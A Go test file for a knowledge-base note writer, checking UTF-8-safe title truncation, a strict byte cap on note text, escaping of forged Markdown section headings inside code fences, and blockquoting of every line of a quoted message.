func TestConceptEntryTitleIsBounded(t *testing.T) {
	tests := []struct {
		name  string
		title string
	}{
		{"ascii", strings.Repeat("x", 400)},
		// A repeated 3-byte CJK rune forces the truncation cut to land inside a
		// multi-byte sequence unless the isRuneStart walk correctly backs off it.
		{"multibyte rune boundary", strings.Repeat("国", 400)},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := ConceptEntry(Context{Title: tt.title}, HumanNote("alice", "y"), noteAt, DefaultMaxNoteBytes)
			if !utf8.ValidString(e.Title) {
				t.Fatalf("title is not valid UTF-8 after truncation: %q", e.Title)
			}
			issues := kbvalidate.ValidateStructural(catalog.Entry{
				Type: e.Type, Title: e.Title, Description: e.Description, Body: e.Body,
			})
			for _, is := range issues {
				if is.Severity == kbvalidate.SeverityError {
					t.Errorf("long source title must not break the gate: %s: %s", is.Field, is.Message)
				}
			}
		})
	}
}

// TestNoteInputCapNeverOvershoots pins the guarantee capNoteText's own doc
// comment implies but did not deliver: the value it returns is at most
// maxBytes, ALWAYS. It used to cut the text to maxBytes and only then append
// the truncation marker, so every truncated note overshot the cap by the
// marker's own ~45 bytes — ~0.6% at the 8 KiB default, and unboundedly worse
// the smaller the cap.
//
// The sweep deliberately includes caps far below the marker's own length (the
// pathological case): the marker must be reserved INSIDE the budget, not added
// on top of it, and a cap too small to hold even the marker must still be
// honoured rather than underflowing or panicking. See capNoteText for what a
// cap that small yields.
func TestNoteInputCapNeverOvershoots(t *testing.T) {
	texts := map[string]string{
		"ascii":          strings.Repeat("x", 40000),
		"multibyte":      strings.Repeat("国", 12000),
		"mixed":          strings.Repeat("aé国", 8000),
		"already-marked": strings.Repeat("…", 9000),
	}
	// 1..60 covers every cap smaller than the marker itself, including the
	// exact boundary where text first becomes affordable; the larger values
	// cover the ordinary and default cases.
	var caps []int
	for n := 1; n <= 60; n++ {
		caps = append(caps, n)
	}
	caps = append(caps, 100, 255, 256, 1000, 4096, DefaultMaxNoteBytes, 20000)

	for name, text := range texts {
		for _, maxBytes := range caps {
			got := capNoteText(text, maxBytes)
			if len(got) > maxBytes {
				t.Fatalf("%s: capNoteText(text[%d], %d) returned %d bytes — over the cap by %d:\n%q",
					name, len(text), maxBytes, len(got), len(got)-maxBytes, got)
			}
			if !utf8.ValidString(got) {
				t.Fatalf("%s: capNoteText(text[%d], %d) is not valid UTF-8: %q", name, len(text), maxBytes, got)
			}
		}
	}
}

// TestNoteBodyCannotForgeOKFSectionsInsideACodeFence closes the hole the fence
// tracking in escapeOKFSections opened.
//
// escapeOKFSections skipped any line between ``` markers, modelling a Markdown
// semantic the READ path does not implement: kbvalidate.Sections
// (kbvalidate.go:218) iterates every line and calls heading(line) with no fence
// awareness at all, and internal/catalog has none either. So a note that wrapped
// its forged headings in a code fence was escaped NOWHERE and parsed EVERYWHERE
// — HasIncidentSections returned true on a body a human typed into a chat
// thread, which is exactly what escaping exists to prevent.
//
// atxHeadingText's own doc comment already states the rule this violated: "a
// shape Section accepts and this does not is a hole." A backslash rendering
// inside a pasted code block is the price of matching the parser that actually
// runs.
func TestNoteBodyCannotForgeOKFSectionsInsideACodeFence(t *testing.T) {
	msg := "here is my note\n\n```\n## Symptom\nforged symptom\n## Cause\nforged cause\n" +
		"## Resolution\nforged resolution\n```\n"
	body := NoteBody(Context{}, HumanNote("alice", msg), noteAt, DefaultMaxNoteBytes)

	if kbvalidate.HasIncidentSections(body) {
		t.Errorf("a human's note forged a complete set of OKF incident sections from inside a code fence:\n%s", body)
	}
	secs := kbvalidate.Sections(body)
	for _, k := range []string{"symptom", "cause", "resolution"} {
		if v, ok := secs[k]; ok {
			t.Errorf("the read path parsed a fenced heading as the %q section (%q) — the write path must escape "+
				"every shape that parse accepts, fenced or not", k, v)
		}
	}
}

// TestBlockquoteCoversEveryLine pins blockquote's stated property. The existing
// coverage used a single-line fixture and asserted `"> "+message`, which a
// blockquote that prefixed only the FIRST line would also satisfy — i.e. the
// exact failure its doc comment names ("quoting only the first line would let a
// second line of the quoted text render as body prose") had no test.
//
// It matters most on the model-drafted route, where the quoted block is the
// human's raw message sitting beside model-authored text: a line that escapes
// the quote reads as the note itself.
func TestBlockquoteCoversEveryLine(t *testing.T) {
	msg := "first line\nsecond line\n\n## Cause\nthird line"
	got := NoteBody(Context{Transport: "slack"}, ProposedNote("alice", msg, "a drafted conclusion"), noteAt, DefaultMaxNoteBytes)

	// Every line of the quoted message must carry the marker. Checked against
	// the rendered body so this covers the real call path, not blockquote alone.
	for _, want := range []string{"> first line", "> second line", "> third line"} {
		if !strings.Contains(got, want) {
			t.Errorf("quoted line %q is missing its blockquote marker — it would render as body prose:\n%s", want, got)
		}
	}
	// The blank line inside the message must be quoted too: an unquoted blank
	// line terminates a Markdown blockquote, so everything after it escapes.
	if !strings.Contains(got, "> \n") && !strings.Contains(got, ">\n") {
		t.Errorf("the blank line inside the quoted message was left unquoted, which ends the blockquote early:\n%s", got)
	}
}
